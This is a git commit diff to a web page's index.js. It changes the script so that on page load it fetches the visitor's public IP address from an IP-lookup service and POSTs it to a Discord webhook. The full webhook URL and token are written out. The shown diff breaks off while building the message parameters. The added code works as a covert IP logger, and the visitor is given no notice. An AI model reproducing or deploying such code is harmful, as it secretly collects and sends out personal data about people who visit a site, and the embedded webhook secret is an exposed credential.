95afe7d4a2fcccfbbf910b30a0177f481dcf8fdf
Krilexu <53452586+Krilexu@users.noreply.github.com>
2024-12-17 19:56:28 +0100

    Update index.js

--- index.js
+++ index.js
@@ -5,16 +5,18 @@ $(window).load(function() {
 
 
 function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1318648499599839253/b6yUhYvvxVPzD008yXF_uiPnuKLuwvciX4FOBcG9Mfsx2dkoevCE-wssJXO8Z8xfUXQt");
-
-      request.setRequestHeader('Content-type', 'application/json');
+     
  }
       
 
 fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
+        const request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1318648499599839253/b6yUhYvvxVPzD008yXF_uiPnuKLuwvciX4FOBcG9Mfsx2dkoevCE-wssJXO8Z8xfUXQt");
+
+      request.setRequestHeader('Content-type', 'application/json');
+      
        let params = {
         username: "lob",
         avatar_url: "",
